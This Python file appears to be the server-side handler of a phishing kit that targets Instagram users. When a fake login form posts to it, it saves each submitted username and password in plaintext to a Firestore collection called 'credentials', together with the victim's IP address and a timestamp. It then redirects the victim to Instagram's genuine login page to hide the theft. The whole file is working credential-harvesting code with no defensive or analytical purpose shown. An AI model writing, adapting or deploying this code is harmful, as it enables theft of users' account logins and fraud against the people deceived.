import firebase_admin
from firebase_admin import credentials, firestore, initialize_app
import json
import os
from datetime import datetime

# Initialize Firebase
if not firebase_admin._apps:
    cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
    initialize_app(cred)

db = firestore.client()

def handler(request):
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            doc_ref = db.collection('credentials').document()
            doc_ref.set({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'ip_address': request.headers.get('x-forwarded-for', '')
            })
        
        return {
            'statusCode': 302,
            'headers': {
                'Location': 'https://www.instagram.com/accounts/login/'
            }
        }
    
    return {'statusCode': 405}  # Method not allowed